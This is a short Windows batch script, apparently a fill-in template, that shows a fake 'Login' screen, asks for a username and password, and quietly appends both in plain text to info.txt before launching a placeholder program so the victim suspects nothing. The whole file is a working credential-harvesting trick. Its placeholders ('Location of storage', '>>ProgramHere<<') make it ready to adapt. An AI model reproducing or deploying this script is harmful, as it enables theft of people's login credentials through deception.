@echo off
color a 
title Login
cls
echo Please enter your Email ID and Password
echo.
echo.
cd "Location of storage"
set /p user=Username :
set /p pass=Password :
echo Username="%user%" Password="%pass%" >> info.txt
start >>ProgramHere<<
exit